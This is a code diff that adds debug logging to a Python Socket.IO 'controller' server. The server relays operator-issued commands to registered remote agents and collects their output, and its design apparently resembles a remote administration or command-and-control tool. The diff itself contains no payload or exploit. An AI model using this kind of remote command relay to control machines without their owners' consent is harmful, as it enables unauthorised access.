@@ -3136,6 +3136,7 @@ def handle_agent_connect(data):
             'status': 'success'
         }, room='operators', broadcast=True)
         print(f"Agent {agent_id} connected with SID {request.sid}")
+        print(f"🔍 Controller: Agent registration successful. AGENTS_DATA now contains: {list(AGENTS_DATA.keys())}")
     except Exception as e:
         print(f"Error handling agent_connect: {e}")
         emit('registration_error', {'message': 'Failed to register agent'}, room=request.sid)
@@ -3146,6 +3147,9 @@ def handle_execute_command(data):
     agent_id = data.get('agent_id')
     command = data.get('command')
     
+    print(f"🔍 Controller: execute_command received for agent {agent_id}, command: {command}")
+    print(f"🔍 Controller: Current AGENTS_DATA: {list(AGENTS_DATA.keys())}")
+    
     agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
     if agent_sid:
         # Generate execution ID for tracking
@@ -3155,8 +3159,9 @@ def handle_execute_command(data):
             'command': command,
             'execution_id': execution_id
         }, room=agent_sid)
-        print(f"Sent command '{command}' to agent {agent_id} with execution_id {execution_id}")
+        print(f"🔍 Controller: Sent command '{command}' to agent {agent_id} with execution_id {execution_id}")
     else:
+        print(f"🔍 Controller: Agent {agent_id} not found or disconnected. Available agents: {list(AGENTS_DATA.keys())}")
         emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)
 
 @socketio.on('process_list')
@@ -4061,6 +4066,8 @@ def handle_performance_update(data):
 def handle_command_result(data):
     """Handle command execution results from agents"""
     print(f"🔍 Controller: Command result received: {data}")
+    print(f"🔍 Controller: Received from SID: {request.sid}")
+    print(f"🔍 Controller: Current agents: {list(AGENTS_DATA.keys())}")
     
     agent_id = data.get('agent_id')
     execution_id = data.get('execution_id')
@@ -4072,6 +4079,7 @@ def handle_command_result(data):
     print(f"🔍 Controller: Processing command result for agent {agent_id}")
     print(f"🔍 Controller: Command: {command}")
     print(f"🔍 Controller: Output length: {len(output)}")
+    print(f"🔍 Controller: Agent exists in AGENTS_DATA: {agent_id in AGENTS_DATA}")
     
     # Broadcast command result to operators
     result_data = {
